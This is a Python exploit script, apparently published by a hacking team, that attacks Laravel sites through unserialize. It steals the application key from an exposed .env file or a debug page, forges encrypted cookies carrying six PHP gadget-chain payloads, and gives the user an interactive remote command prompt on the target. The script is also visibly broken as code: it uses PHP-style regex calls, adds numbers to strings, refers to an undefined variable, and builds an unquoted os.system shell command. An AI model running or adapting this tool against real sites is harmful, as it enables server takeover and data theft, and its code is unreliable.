#!/usr/bin/python3.9.1

import os
sist = os.system
try:
  import requests,sys,base64,hmac,hashlib,json,inspect,pycurl,re,argparse
except Exception as err:
  print('Module tidak lengkap, install module yang diperlukan dulu ->',err)
  sist('pip install requests pycurl')

def substr(string, start, length = 0):
      if start < 0:
        start = start + len(string)
      if not length:
        return string[start:]
      if length > 0:
        return string[start:start + length]
      else:
        return string[start:length]


class Func_:
  
  def Serialize(self,key,value):
    value = sist('echo '+ str(base64.b64decode(value))+' | openssl aes-256-cbc -e -p '+ str(base64.b64decode(key)))
    if value == False:
      quit('Tidak bisa mengenkripsi data')
    iv = base64.b64encode(os.urandom(16))
    mac = hmac.new(iv+bytes(value),str(base64.b64decode(key)).encode(),hashlib.sha256)
    def compact(*names):
      caller = inspect.stack()[1][0]
      vars = {}
      for n in names:
        if n in caller.f_locals:
            vars[n] = caller.f_locals[n]
        elif n in caller.f_globals:
            vars[n] = caller.f_globals[n]
      return vars
    json = json.dumps(compact('iv','value','mac'))
    if json == False:
      quit('Could not encode json data')
    encodedPayload = base64.b64encode(json)
    return encodedPayload
    
  def GeneratePayload(self,command,func='system',method=1):
    payload = []
    p = "<?php "+command+" exit;?>"
    if method == 1:
      payload = 'O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:15:"Faker\Generator":1:{s:13:"' + "\x00" + '*' + "\x00" + 'formatters";a:1:{s:8:"dispatch";s:' + len(func) + ':"' + func + '";}}s:8:"' + "\x00" + '*' + "\x00" + 'event";s:' + len(command) + ':"' + command + '";}'
    elif method == 2:
      payload = 'O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:28:"Illuminate\Events\Dispatcher":1:{s:12:"' + "\x00" + '*' + r"\x00" + 'listeners";a:1:{s:' + len(command) + ':"' + command + '";a:1:{i:0;s:' + len(func) + ':"' + func + '";}}}s:8:"' + "\x00" + '*' + "\x00" + 'event";s:' + len(command) + ':"' + command + '";}'
    elif method == 3:
      payload = 'O:40:"Illuminate\Broadcasting\PendingBroadcast":1:{s:9:"' + "\x00" + '*' + "\x00" + r'events";O:39:"Illuminate\Notifications\ChannelManager":3:{s:6:"' + "\x00" + '*' + "\x00" + 'app";s:' + len(command) + ':"' + command + '";s:17:"' + "\x00" + '*' + "\x00" + 'defaultChannel";s:1:"x";s:17:"' + "\x00" + '*' + "\x00" + 'customCreators";a:1:{s:1:"x";s:' +len(func) + ':"' + func + '";}}}'
    elif method == 4:
      payload = 'O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:31:"Illuminate\Validation\Validator":1:{s:10:"extensions";a:1:{s:0:"";s:' + len(func) + ':"' + func + '";}}s:8:"' + "\x00" + '*' + "\x00" + 'event";s:' + len(command) + ':"' + command + '";}'
    elif method == 5:
      payload = 'O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:25:"Illuminate\Bus\Dispatcher":1:{s:16:"' + "\x00" + '*' + "\x00" + 'queueResolver";a:2:{i:0;O:25:"Mockery\Loader\EvalLoader":0:{}i:1;s:4:"load";}}s:8:"' + "\x00" + '*' + "\x00" + 'event";O:38:"Illuminate\Broadcasting\BroadcastEvent":1:{s:10:"connection";O:32:"Mockery\Generator\MockDefinition":2:{s:9:"' + "\x00" + '*' + "\x00" + 'config";O:35:"Mockery\Generator\MockConfiguration":1:{s:7:"' + "\x00" + '*' + "\x00" + 'name";s:7:"abcdefg";}s:7:"' + "\x00" + '*' + "\x00" + 'code";s:'+ len(p) + ':"' + p + '";}}}'
    elif method == 6:
      payload = 'O:29:"Illuminate\Support\MessageBag":2:{s:11:"' + "\x00" + '*' + "\x00" + 'messages";a:0:{}s:9:"' + "\x00" + '*' + "\x00" + 'format";O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:25:"Illuminate\Bus\Dispatcher":1:{s:16:"' + "\x00" + '*' + "\x00" + 'queueResolver";a:2:{i:0;O:25:"Mockery\Loader\EvalLoader":0:{}i:1;s:4:"load";}}s:8:"' + "\x00" + '*' + "\x00" + 'event";O:38:"Illuminate\Broadcasting\BroadcastEvent":1:{s:10:"connection";O:32:"Mockery\Generator\MockDefinition":2:{s:9:"' + "\x00" + '*' + "\x00" + 'config";O:35:"Mockery\Generator\MockConfiguration":1:{s:7:"' + "\x00" + '*' + "\x00" + 'name";s:7:"abcdefg";}s:7:"' + "\x00" + '*' + "\x00" + 'code";s:' + len(p) + ':"' + p + '";}}}}'
    return base64.b64encode(bytes(payload))
    
    
class Requester:
  
  def __init__(self,url,strgs):
    self.Requests(url)
    self.HeadersToArray(strgs)
    
  def HeadersToArray(self,strgs):
      strgs = str(strgs).split("\r\n")
      strgs = strgs[0 : len(strgs)-1]
      output = []
      for item in strgs:
        if item == '' or item == False:
          continue
        index = item.find(": ")
        key = substr(str(item), 0, index)
        key = key.lower().replace("-","_")
        value = substr(str(item), index + 2)
        if output[key] == True:
          if key == 'set_cookie':
            output[key] = output[key] + "; " + value
          else:
            output[key] = output[key]
        else:
          output[key] = value
      return output
  
  def Requests(self,url,postdata=None,headers=None,follow=True):
    ch = pycurl.Curl()
    ch.setopt(ch.URL, url)
    ch.setopt(ch.SSL_VERIFYPEER, 0)
    ch.setopt(ch.SSL_VERIFYHOST, 0)
    if headers != [] and headers != None:
      ch.setopt(ch.HTTPHEADER, headers)
    if postdata != [] and postdata != None:
      ch.setopt(ch.POST, 1)
      ch.setopt(ch.POSTFIELDS, postdata)
    if follow == True:
      ch.setopt(ch.FOLLOWLOCATION, 1)
    data = ch.perform()
    header_size = ch.getinfo(ch.HEADER_SIZE)
    status_code = ch.getinfo(ch.HTTP_CODE)
    head = substr(str(data), 0, header_size)
    body = substr(str(data), header_size)
    return json.loads(json.dumps({'status_code':status_code,'headers':self.HeadersToArray(head),'body':body}))
    
      
      
class Exploit(Requester):
  url = []
  vuln = []
  app_key = []
  
  def __init__(self,url):
    self.url = url
    self.vuln = None
    self.app_key = None
    
  def getAppKeyEnv(self):
    req = super().Requests(self.url + "/.env",None,None,follow = False)
    if re.match('/APP_KEY/',req):
      re.fullmatch('/APP_KEY=([a-zA-Z0-9:;\/\\=$%^&*()-+_!@#]+)/',req,matches,SET_ORDER,0)
      self.app_key = matches[0][1]
  
  def getAppKey(self):
    req = super().Requests(self.url,'a=a',None, False)
    if re.match('/<td>APP_KEY<\/td>/',str(req)):
      re.fullmatch('/<td>APP_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>/', req, matches, SET_ORDER, 0)
      self.app_key = matches[0][1]
    else:
      self.getAppKeyEnv(self.url)
  

def Help():
  print("""
[|] ---------------------- [|]
[#]   Laravel deserialize  [#]
[#]       by: EtcAug10     [#]
[#]     D45H7 Coder Team   [#]
[|] ---------------------- [|]

IF this tool didn\'t work anything. USE our web based tool in:
\033[32;5mhttps://tools.d4rk5idehacker.or.id/Penetration-Testing/laravel-unserialized.php\033[00;0m
  """)
  args.print_help()

args = argparse.ArgumentParser(usage='deslarvel.py -u URL [OPTION]',epilog='Please support as for making more usefull tool script for hacking activity')

args.add_argument('-u','--url',help='URL Target Required')
args.add_argument('-k','--app-key',help='Setting own APP_KEY if you have it')
args.add_argument('-f','--function',help='The functions. Example: system, passthru')
args.add_argument('-m','--method',help='Method 1 - 4 required function parameter, 5 - 6 (eval mode)')

argument = args.parse_args()

if len(sys.argv) < 2:
  Help()
else:
  head = []
  Req = Requester(argument.url,head)
  wibu = Exploit(argument.url)
  Func = Func_()
  function = 'system'
  method = 1
  if argument.app_key:
    wibu.app_key = argument.app_key
  else:
    try:
      wibu.getAppKey()
    except:
      print('\033[31;1mUnknown Error Occured')
  if argument.function:
    function = argument.function
  if argument.method:
    method = argument.method
  if wibu.app_key:
    while True:
      cmd = input('\ncommand ~> ')
      app = str(wibu.app_key).replace('base64:','')
      command = Func.GeneratePayload(cmd, function, method)
      serialize = Func.Serialize(app, command)
      header = {'Cookie: XSRF-Token=': serialize}
      bre = Req.Requests(urls, None, header, False)
      res = bre.split('</html>')[1]
      if res == True:
        print(res)
      else:
        print('Empty Response')
  else:
    print(argument.url,'====> Cannot get APP_KEY!')
  
#EndOfCodes <3